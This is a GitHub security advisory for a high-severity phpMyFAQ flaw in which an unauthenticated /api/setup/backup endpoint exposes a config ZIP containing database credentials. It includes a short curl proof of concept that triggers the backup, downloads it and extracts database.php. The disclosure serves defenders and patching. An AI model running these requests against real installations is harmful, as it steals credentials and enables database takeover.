# [H] phpMyFAQ has unauthenticated config backup download via /api/setup/backup

## Summary
Severity: High
Advisory: GHSA-9cg9-4h4f-j6fg
CVE: CVE-2025-69200
CWE: CWE-202
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-12-30
Source: https://github.com/advisories/GHSA-9cg9-4h4f-j6fg
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.0.16
- Packagist: `thorsten/phpmyfaq` — affected >=4.1.0-alpha

## Details
### Summary
An unauthenticated remote attacker can trigger generation of a configuration backup ZIP via `POST /api/setup/backup` and then download the generated ZIP from a web-accessible location. The ZIP contains sensitive configuration files (e.g., `database.php` with database credentials), leading to high-impact information disclosure and potential follow-on compromise.

### Details
The endpoint `/api/setup/backup` is reachable via default rewrite rules and does not enforce authentication/authorization or API token verification. When called with any non-empty body (used as an “installed version” string), the server creates a ZIP archive inside the configuration directory and returns a direct URL to the generated ZIP file.

Relevant code paths:
- Rewrite rule exposing the endpoint:
  - `phpmyfaq/.htaccess`: `RewriteRule ^api/setup/(check|backup|update-database) api/index.php [L,QSA]`
- Controller implementation:
  - `phpmyfaq/src/phpMyFAQ/Controller/Api/SetupController.php` → `backup()`
    - No call to `hasValidToken()`, `userIsAuthenticated()`, or any permission check
- Backup creation:
  - `phpmyfaq/src/phpMyFAQ/Setup/Update.php` → `createConfigBackup()`
    - Writes the ZIP into the config directory and returns a public URL under `content/core/config/`

### PoC
Replace `BASE_URL` with your instance URL.

1) Trigger config backup generation without authentication:

```bash
BASE_URL="http://localhost"
curl -i -X POST "${BASE_URL}/api/setup/backup" \
  -H "Content-Type: text/plain" \
  --data "4.1.0-RC"
```

Expected result: `200 OK` with JSON containing `backupFile`.

2) Copy the `backupFile` URL from the JSON response and download it (still without authentication):

```bash
# Example (replace with the exact URL returned in step 1)
curl -i "http://localhost/content/core/config/phpmyfaq-config-backup.YYYY-MM-DD.zip" -o phpmyfaq-config-backup.zip
```

3) Verify sensitive content exists in the ZIP:

```bash
unzip -l phpmyfaq-config-backup.zip
unzip -p phpmyfaq-config-backup.zip database.php
```

Observed: `database.php` is included and contains DB host/user/password.

### Impact
- Vulnerability class: Missing authentication/authorization for a sensitive function + sensitive information exposure.
- Who is impacted: Any internet-exposed phpMyFAQ installation where the default `.htaccess` rewrite rules are active and the endpoint is reachable.
- Security impact: Disclosure of configuration secrets (DB credentials, integration config, etc.), enabling follow-on attacks such as database takeover and data exfiltration.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9cg9-4h4f-j6fg
- https://nvd.nist.gov/vuln/detail/CVE-2025-69200
- https://github.com/thorsten/phpMyFAQ/commit/b0e99ee3695152115841cb546d8dce64ceb8c29a
- https://github.com/thorsten/phpMyFAQ
